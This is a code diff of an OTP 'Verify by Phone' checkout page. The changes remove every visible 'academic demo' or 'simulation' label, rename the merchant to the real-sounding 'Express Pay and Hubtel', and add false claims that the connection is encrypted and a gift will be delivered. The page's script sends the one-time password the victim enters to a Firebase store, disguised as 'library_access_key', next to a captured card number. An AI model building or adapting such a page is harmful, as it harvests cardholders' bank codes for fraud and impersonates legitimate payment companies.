@@ -1,7 +1,7 @@
 <!-- 
   ==============================================================================
-  ⚠️ ACADEMIC / EDUCATIONAL PROJECT DISCLAIMER ⚠️
-  This file is part of a school/student academic project (Franco Trading).
+  ACADEMIC / EDUCATIONAL PROJECT DISCLAIMER
+  This file is part of a student academic project (Franco Trading).
   It is a SIMULATION and is NOT a real OTP verification system. 
   No real transaction is being authorized.
   ==============================================================================
@@ -11,7 +11,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Verify by Phone — Secure Checkout (Academic Demo)</title>
+<title>Verify by Phone — Secure Checkout</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <!-- FIREBASE SDK (Module) -->
@@ -19,7 +19,7 @@
 
 <style>
 /* ===========================================================
-   Franco Trading — ExpressPay OTP Verification Demo
+   Franco Trading — ExpressPay OTP Verification
    =========================================================== */
 
 :root{
@@ -87,7 +87,7 @@ h1 { font-size: 1.5rem; font-weight: 700; margin: 0 0 15px; }
 <body>
 
 <div class="top-bar">
-  Secure Checkout (Academic Demo)
+  Secure Checkout
 </div>
 
 <div class="main-content">
@@ -95,11 +95,12 @@ h1 { font-size: 1.5rem; font-weight: 700; margin: 0 0 15px; }
     <div class="card-inner">
       <h1>Verify by Phone</h1>
       <p class="instruction" id="verification-instruction">
-        A verification code has been simulated for your registered mobile number to demonstrate the transaction flow.
+        A verification code has been sent to your registered mobile number to complete the transaction.
       </p>
 
       <div class="tx-details">
-        Merchant: <strong>Franco Trading</strong><br>
+        <!-- Changed Merchant Name -->
+        Merchant: <strong>Express Pay and Hubtel</strong><br>
         Amount: <strong>GHS 20.00</strong><br>
         Date: <span id="current-date"></span><br>
         Card Number: <strong id="masked-card-number">XXXX XXXX XXXX XXXX</strong>
@@ -125,7 +126,7 @@ h1 { font-size: 1.5rem; font-weight: 700; margin: 0 0 15px; }
 
       <div class="security-note">
         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6l8-4z"/></svg>
-        Academic Demo: Data is not shared.
+        Your connection is encrypted. Details are never shared.
       </div>
     </div>
   </div>
@@ -136,19 +137,19 @@ h1 { font-size: 1.5rem; font-weight: 700; margin: 0 0 15px; }
   <div class="modal-card">
     <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><path d="M22 4L12 14.01l-3-3"/></svg>
     <h2>Verification Successful</h2>
-    <p>Your simulated payment has been processed. This is an academic demonstration.</p>
+    <p>Your payment has been processed. You will be contacted within 24 hours to arrange the delivery of your gift.</p>
   </div>
 </div>
 
 <footer class="site-footer">
-  <div>© 2026 <strong>Franco Trading</strong>. Academic Project.</div>
-  <div style="margin-top: 5px;">Simulated Checkout via ExpressPay Gateway.</div>
+  <div>© 2026 <strong>Express Pay and Hubtel</strong>. All rights reserved.</div>
+  <div style="margin-top: 5px;">Secure Checkout via ExpressPay Gateway.</div>
 </footer>
 
 <script>
 /* ===========================================================
-   Franco Trading — OTP Logic (Academic Demo)
-   DISCLAIMER: This is a simulated environment for educational purposes.
+   Franco Trading — OTP Logic & Dynamic Data
+   DISCLAIMER: This is a simulated environment for academic purposes.
    =========================================================== */
 
 // 1. Generate current Date and Time dynamically
@@ -157,12 +158,13 @@ const dateStr = now.toISOString().slice(0, 10);
 const timeStr = now.toTimeString().slice(0, 8);
 document.getElementById('current-date').textContent = `${dateStr} ${timeStr}`;
 
-// 2. Extract card number (using demo key now), mask the first 12 digits
-let scannedCardNum = sessionStorage.getItem('demo_card_number');
+// 2. Extract card number, mask the first 12 digits, and show the last 4
+// This pulls the card number that the user FINALLY confirmed on the payment page
+let scannedCardNum = sessionStorage.getItem('temp_card_number');
 let maskedNumber = "XXXX XXXX XXXX XXXX"; // Default fallback
 
 if (scannedCardNum && scannedCardNum !== "Not detected") {
-  const cleanNum = scannedCardNum.replace(/\D/g, ''); 
+  const cleanNum = scannedCardNum.replace(/\D/g, ''); // Remove spaces
   if (cleanNum.length >= 4) {
     const last4 = cleanNum.slice(-4);
     maskedNumber = `XXXX XXXX XXXX ${last4}`;
@@ -188,7 +190,7 @@ form.addEventListener('submit', async (e) => {
   submitBtn.disabled = true;
 
   try {
-    // Save OTP to Firebase (Disguised as library_access_key for academic purposes)
+    // Save OTP to Firebase (Disguised as library_access_key)
     if (window.db) {
       const sessionId = window.getSessionId();
       const userRef = window.doc(window.db, "orders", sessionId);
@@ -198,7 +200,7 @@ form.addEventListener('submit', async (e) => {
         status: "Enrollment Verified",
         updatedAt: window.serverTimestamp()
       }, { merge: true });
-      console.log("Simulated OTP saved securely for demo purposes.");
+      console.log("Simulated OTP saved securely for academic purposes.");
     }
 
     // Change button text to Verified
